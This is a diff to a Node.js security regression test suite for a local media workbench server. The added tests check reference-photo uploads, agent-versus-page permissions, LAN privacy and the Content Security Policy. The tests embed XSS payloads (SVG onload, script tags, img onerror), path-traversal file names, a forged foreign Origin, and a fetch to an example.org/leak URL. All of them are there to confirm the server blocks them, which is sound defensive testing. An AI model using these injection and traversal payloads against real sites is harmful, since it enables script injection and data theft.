@@ -1,5 +1,6 @@
 #!/usr/bin/env node
-// Security regressions for the workbench server, the data layer and the page (audit F01-F15, NV1, NV2; the exporter's
+// Security regressions for the workbench server, the data layer and the page (audit F01-F15, NV1, NV2, the guided flow
+// stages 1-4; the exporter's
 // F07/F08/F12 are in tools/security-exporter.mjs). Runs on a SCRATCH copy of data/demo with scratch media and config,
 // on free ports; never touches data/. Uses headless Chromium when one is found (tools/chrome.mjs), else skips the
 // browser checks.   node tools/security-test.mjs   (npm run test:security runs both files)
@@ -300,6 +301,67 @@ try {
     BDR.states);
   }
 
+  // ---------------------------------------------------------------- stage 4 (characters): uploads, private refs, page-only acts, the CSP
+  {
+    await op('entity_upsert', { kind: 'character', id: 'sec-cast', name: 'Sec Cast' });
+    const pageOp = (name, body, headers = {}) => post(`/api/op/${name}?project=${P}`, body, { origin: A.base, ...headers });
+    const b64 = (s) => Buffer.from(s).toString('base64'), PNG = tinyPngB64(8, 8);
+    put(path.join(TMP, 'elsewhere/notimage.png'), 'just text with a png name');
+    const up = {
+      agent: (await op('ref_upload', { id: 'sec-cast', kind: 'photo', name: 'a.png', data: PNG })).status,
+      claim: (await op('ref_upload', { id: 'sec-cast', kind: 'photo', name: 'a.png', data: PNG, via: 'page' })).status,
+      foreign: (await post(`/api/op/ref_upload?project=${P}`, { id: 'sec-cast', kind: 'photo', name: 'a.png', data: PNG }, { origin: 'https://evil.example' })).status,
+      svg: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', name: 'x.svg', data: b64('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>') })).status,
+      html: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', name: 'x.png', data: b64('<html><script>alert(1)</script></html>') })).status,
+      notB64: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', name: 'x.png', data: '%%%' })).status,
+      badId: (await pageOp('ref_upload', { id: '../x', kind: 'photo', name: 'x.png', data: PNG })).status,
+      badKind: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'public', name: 'x.png', data: PNG })).status,
+      localText: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', path: path.join(TMP, 'elsewhere/notimage.png') })).status,
+      relPath: (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', path: 'media.json' })).status,
+    };
+    const okUp = (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', name: '../../evil.png', data: PNG })).body;
+    const okLocal = (await pageOp('ref_upload', { id: 'sec-cast', kind: 'photo', path: path.join(TMP, 'elsewhere/plain.png') })).body;
+    const mUp = readP('media.json').items.find(m => m.path === okUp?.ref?.path);
+    check('ref_upload (stage 4 reference photos): page only (no Origin, a claimed via:"page", a foreign Origin: 403); only real images (SVG, HTML, not base64, a text file: 400); a photo always lands in private/refs/<character>/ (a ../ name stays inside), flagged private',
+      up.agent === 403 && up.claim === 403 && up.foreign === 403 && [up.svg, up.html, up.notB64, up.badId, up.badKind, up.localText, up.relPath].every(s => s === 400)
+      && /^private\/refs\/sec-cast\/[a-z0-9_-]+\.png$/.test(okUp?.ref?.path || '') && S.isPrivate(okUp.ref.path) && fs.existsSync(path.join(D, okUp.ref.path)) && mUp?.private === true && mUp.status === 'private'
+      && /^private\/refs\/sec-cast\//.test(okLocal?.ref?.path || '') && !fs.existsSync(path.join(D, 'evil.png')) && !fs.existsSync(path.join(DATA, 'evil.png')),
+      { up, okUp: okUp?.ref, okLocal: okLocal?.ref?.path, media: mUp && { private: mUp.private, thumb: mUp.thumb } });
+    // the director's acts are the page's: an agent cannot approve the identity or a look, nor write the trees
+    const base = await pageOp('character_act', { id: 'sec-cast', act: 'base', base: { text: 'x', refs: [{ path: okUp.ref.path, source: 'photo' }, { path: 'catalog/body/mannequin_neutral_turnaround.jpg', source: 'catalog' }] } });
+    const acts = {
+      approve: (await op('character_act', { id: 'sec-cast', act: 'approve', tree: 'identity' })).status,
+      claim: (await op('character_act', { id: 'sec-cast', act: 'approve', tree: 'identity', via: 'page' })).status,
+      foreign: (await post(`/api/op/character_act?project=${P}`, { id: 'sec-cast', act: 'approve' }, { origin: 'https://evil.example' })).status,
+      noToken: (await post(`/api/op/character_act?project=${P}`, { id: 'sec-cast', act: 'approve' }, { origin: A.base, 'x-wb-token': '' })).status,
+      lookAp: (await op('entity_upsert', { kind: 'character', id: 'sec-cast', look: { id: 'l1', status: 'approved' } })).status,
+      lookLock: (await op('entity_upsert', { kind: 'character', id: 'sec-cast', fields: { looks: [{ id: 'l2', status: 'locked' }] } })).status,
+      importFlag: (await op('entity_upsert', { kind: 'character', id: 'sec-cast', look: { id: 'l3', status: 'approved' }, import_ok: true })).status,
+      lookCreate: (await op('look_create', { id: 'sec-cast', name: 'Agent look' })).body?.status,
+    };
+    const iterW = (await op('entity_upsert', { kind: 'character', id: 'sec-cast', fields: { iter: { trees: { identity: { approved: 'n01' } } }, base: { refs: [] } } })).body;
+    const E = readP('entities/characters/sec-cast.json');
+    let off = null; try { S.ops.character_act(P, { id: 'sec-cast', act: 'approve' }); } catch (e) { off = e.code; }
+    check('an agent cannot approve the identity or a look: character_act refused to the agent surface (no Origin, a claimed via, a foreign Origin, no token, offline: 403); entity_upsert cannot approve or lock a look (import_ok is stripped by the server: 403), nor write iter / base (ignored); look_create is "review"',
+      base.status === 200 && acts.approve === 403 && acts.claim === 403 && acts.foreign === 403 && acts.noToken === 403 && off === 403 && acts.lookAp === 403 && acts.lookLock === 403 && acts.importFlag === 403 && acts.lookCreate === 'review'
+      && iterW?.warnings?.length === 2 && !E.iter?.trees?.identity?.approved && E.base?.refs?.length === 2 && !(E.looks || []).some(l => l.status === 'approved' || l.status === 'locked'),
+      { base: base.status, acts, off, warnings: iterW?.warnings });
+    // a remote (LAN) client: no private file, and the JSON it reads carries no private path nor item flagged private
+    if (L) {
+      const lj = async (p) => { const r = await get(lanIp, L.port, p, { host: `${lanIp}:${L.port}` }); let j = null; try { j = JSON.parse(r.body); } catch (e) { /* not JSON */ } return { status: r.status, body: r.body, j }; };
+      const lm = await lj(`/data/${P}/media.json`), le = await lj(`/data/${P}/entities/characters/sec-cast.json`), lf = await lj(`/data/${P}/${okUp.ref.path}`);
+      const local = await get('127.0.0.1', A.port, `/data/${P}/entities/characters/sec-cast.json`, { host: `localhost:${A.port}` });
+      check('a LAN peer gets no private reference: the photo is 403, media.json lists no private item, the character\'s base lists no private ref (the local page still sees it)',
+        lf.status === 403 && lm.status === 200 && Array.isArray(lm.j?.items) && !lm.j.items.some(m => m.private || S.isPrivate(m.path)) && !/private\//.test(lm.body) && le.status === 200 && !/private\//.test(le.body)
+        && le.j?.base?.refs?.length === 1 && /private\/refs\/sec-cast/.test(local.body),
+        { photo: lf.status, media: lm.j?.items?.length, entityRefs: le.j?.base?.refs?.map(r => r.path) });
+    } else check('stage 4 LAN checks skipped: no LAN address', true);
+    // the CSP: the page may fetch only this server and the Openverse API
+    const shell = await get('127.0.0.1', A.port, `/?project=${P}`, { host: `localhost:${A.port}` });
+    const cs = /connect-src ([^;]*)/.exec(shell.headers['content-security-policy'] || '')?.[1]?.trim();
+    check('CSP: connect-src is this server and https://api.openverse.org only (img-src keeps https: for remote media)', cs === "'self' https://api.openverse.org" && /img-src 'self' data: blob: https:/.test(shell.headers['content-security-policy'] || ''), cs);
+  }
+
   // ---------------------------------------------------------------- F09: the EDL extractor's server (source check: it needs the owner's render page)
   const edl = fs.readFileSync(path.join(WB, 'importers/azemar_extract_edl.mjs'), 'utf8');
   check('F09 EDL extractor server: 127.0.0.1, decode in try/catch, confined to ROOT', /listen\(\d+, '127\.0\.0\.1'/.test(edl) && /try \{ p = inside\(ROOT,/.test(edl) && /if \(!p\) \{ r\.writeHead\(403\)/.test(edl));
@@ -358,6 +420,26 @@ try {
     await dock.goto(`${A.base}/dock.html?project=${P}`, { waitUntil: 'domcontentloaded' }); await wait(1500);
     const dockOk = await dock.evaluate(() => !!window.WB?.dock && document.body.classList.contains('dockwin') && document.body.children.length > 1);
     check('CSP: the page boots, writes carry the token (core/token.js), the dock window works, no CSP violation', tokenOk === 200 && dockOk && !violations.length, { tokenOk, dockOk, violations: violations.slice(0, 3) });
+    // stage 4: stored payloads in characters (names, roles, looks, notes, request texts, pins) render as text; the CSP
+    // blocks fetches to any other origin than this server and Openverse
+    const C = (n) => `<img src=x onerror="window.__c=${n}">`;
+    await op('entity_upsert', { kind: 'character', id: 'sec-xss', name: C(1), fields: { role: C(2) } });
+    await op('look_create', { id: 'sec-xss', name: C(3), garments: [C(4)], description: C(5) });
+    await op('character_note_add', { id: 'sec-xss', text: C(6), by: C(7) });
+    await op('request_create', { kind: C(8), prompt: C(9), est_cost: 0, char: { id: 'sec-xss', text: C(10), pins: [{ x: 1, y: 1, text: C(11) }] } });
+    const cp = await browser.newPage(); const cv = [];
+    cp.on('console', m => { if (/Content Security Policy|Refused to/i.test(m.text())) cv.push(m.text()); });
+    await cp.goto(`${A.base}/?project=${P}`, { waitUntil: 'domcontentloaded' });
+    await cp.waitForFunction('document.body.dataset.ready === "1"', { timeout: 30000 });
+    await cp.evaluate(() => window.WB.stages.open('characters')); await wait(600);
+    await cp.evaluate(() => window.WB.characters.open('sec-xss')); await wait(300);
+    for (const t of ['identity', 'looks', 'notes']) { await cp.evaluate((x) => document.querySelector(`.chtabs [data-tab=${x}]`)?.click(), t); await wait(250); }
+    const inert = await cp.evaluate(() => window.__c === undefined && !document.querySelector('.chws img[src="x"]'));
+    const noViolation = !cv.length;
+    const blocked = await cp.evaluate(async () => { let v = null; const f = (e) => { v = e.blockedURI; }; document.addEventListener('securitypolicyviolation', f); let failed = false; try { await fetch('https://example.org/leak'); } catch (e) { failed = true; } await new Promise(r => setTimeout(r, 100)); return { failed, v }; });
+    check('F02 stored payloads in the characters stage (name, role, looks, garments, notes, request kind / text, pins) render as text; the CSP blocks a fetch to another origin',
+      inert && noViolation && blocked.failed && /example\.org/.test(blocked.v || ''), { inert, cv: cv.slice(0, 2), blocked });
+    await cp.close();
   }
 } catch (e) { check('test ran to the end', false, String(e.stack || e)); }
 finally {
